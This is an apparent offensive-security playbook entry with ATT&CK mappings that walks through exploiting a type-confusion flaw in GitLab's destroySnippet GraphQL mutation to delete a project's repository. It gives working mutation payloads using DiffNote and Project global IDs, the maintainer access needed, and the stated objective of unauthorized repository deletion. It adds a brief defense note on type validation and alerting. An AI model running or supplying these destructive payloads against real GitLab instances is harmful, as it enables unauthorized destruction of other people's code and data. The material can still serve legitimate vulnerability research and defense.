---
id: uuid-execute-mutation
tags:
  - gitlab
  - graphql
  - mutation
  - deletion
type: procedure
tools:
  - '[[tools/GraphiQL-Explorer]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/destroy-snippet-mutation-diffnote]]'
  - '[[commands/destroy-snippet-mutation-project]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Destruction]]'
updated_at: '2025-12-14T17:25:53.154Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Destruction]]'
---
# Execute-DestroySnippet-Mutation

## Summary

This procedure executes the destroySnippet GraphQL mutation using a DiffNote global ID, exploiting type confusion to delete the project repository as a maintainer.

## Description

Navigate to GitLab's GraphiQL explorer and run the mutation with the extracted DiffNote ID. The authorized_find! resolves the ID without type check, passing the DiffNote to Snippets::DestroyService, which calls repository deletion via project.repository. Alternative: Use project ID directly for simpler repro. Targets app/graphql/mutations/snippets/destroy.rb vulnerability.

## Requirements

1. Maintainer session
2. Extracted DiffNote global ID
3. Access to /-/graphiql-explorer

## Defense

Defensive measures and detection strategies:

- Validate object types in GraphQL resolvers
- Log and alert on destroySnippet mutations with non-snippet IDs

## Objectives

1. Bypass snippet restriction using DiffNote
2. Trigger unauthorized repository deletion
3. Confirm success via no errors

## Instructions

### Step 1: Access GraphiQL Explorer

**Context**: Open the interface for mutation execution.

No specific command; navigate to project > Explore > GraphiQL.

> Ensure authenticated as maintainer.

### Step 2: Run DestroySnippet Mutation

**Context**: Input DiffNote ID to exploit type confusion.

Execute [[commands/destroy-snippet-mutation-diffnote]]:

```graphql
mutation test { destroySnippet(input: {id: "gid://gitlab/DiffNote/118"}) { errors } }
```

> Response shows empty errors array; repository is deleted.

### Step 3: Alternative Project ID Test

**Context**: Simplify with direct project ID if needed.

Execute [[commands/destroy-snippet-mutation-project]]:

```graphql
mutation test { destroySnippet(input: {id: "gid://gitlab/Project/<project_id>"}) { errors } }
```

> May succeed or error based on resolution; use for maintainer repro.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data Destruction]]

### Sub-Techniques


## Commands Used

- [[commands/destroy-snippet-mutation-diffnote]]
- [[commands/destroy-snippet-mutation-project]]

## Tools Used

- [[tools/GraphiQL-Explorer]]

## Tags

- gitlab
- graphql
- mutation
- deletion
